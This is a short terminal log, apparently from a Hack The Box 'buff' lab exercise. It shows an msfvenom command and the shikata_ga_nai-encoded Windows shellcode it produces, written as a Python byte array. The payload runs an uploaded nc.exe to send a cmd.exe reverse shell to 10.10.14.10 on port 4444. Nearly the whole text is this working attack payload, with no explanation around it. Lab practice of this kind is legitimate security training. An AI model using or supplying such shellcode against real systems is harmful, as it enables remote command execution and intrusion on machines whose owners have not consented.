...
kali@kali:~/HTB/buff$ msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.10 4444 -e cmd.exe"  -b '\x00\x0A\x0D' -f python -v payload                                                                   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
...
payload =  b""
payload += b"\xbb\x7c\x1b\x5a\x9e\xdb\xd4\xd9\x74\x24\xf4\x5a"
payload += b"\x31\xc9\xb1\x3e\x31\x5a\x14\x03\x5a\x14\x83\xea"
payload += b"\xfc\x9e\xee\xa6\x76\xdc\x11\x57\x87\x80\x98\xb2"
payload += b"\xb6\x80\xff\xb7\xe9\x30\x8b\x9a\x05\xbb\xd9\x0e"
payload += b"\x9d\xc9\xf5\x21\x16\x67\x20\x0f\xa7\xdb\x10\x0e"
payload += b"\x2b\x21\x45\xf0\x12\xea\x98\xf1\x53\x16\x50\xa3"
payload += b"\x0c\x5d\xc7\x54\x38\x2b\xd4\xdf\x72\xba\x5c\x03"
payload += b"\xc2\xbd\x4d\x92\x58\xe4\x4d\x14\x8c\x9d\xc7\x0e"
payload += b"\xd1\x9b\x9e\xa5\x21\x50\x21\x6c\x78\x99\x8e\x51"
payload += b"\xb4\x68\xce\x96\x73\x92\xa5\xee\x87\x2f\xbe\x34"
payload += b"\xf5\xeb\x4b\xaf\x5d\x78\xeb\x0b\x5f\xad\x6a\xdf"
payload += b"\x53\x1a\xf8\x87\x77\x9d\x2d\xbc\x8c\x16\xd0\x13"
payload += b"\x05\x6c\xf7\xb7\x4d\x37\x96\xee\x2b\x96\xa7\xf1"
payload += b"\x93\x47\x02\x79\x39\x9c\x3f\x20\x54\x63\xcd\x5e"
payload += b"\x1a\x63\xcd\x60\x0b\x0b\xfc\xeb\xc4\x4c\x01\x3e"
payload += b"\xa1\xa2\x4b\x63\x80\x2a\x12\xf1\x90\x37\xa5\x2f"
payload += b"\xd6\x41\x26\xda\xa7\xb6\x36\xaf\xa2\xf3\xf0\x43"
payload += b"\xdf\x6c\x95\x63\x4c\x8d\xbc\x27\x48\x2d\x47\xc9"
payload += b"\xc1\xbd\xc7\x55\x72\x49\x4c\x09\xe1\xc2\xd0\xb2"
payload += b"\x9c\x49\xb5\x49\x2f\xfd\x2a\xd3\xab\xa1\xda\x70"
payload += b"\x1a\x3c\x5b\x12\x42\x8f\xab\xf2\xb3\xdf\xe5\x3b"
payload += b"\x80\x31\xcb\x0b\xc8\x79\x1f\x58\x3c\xa1\x72\xc5"
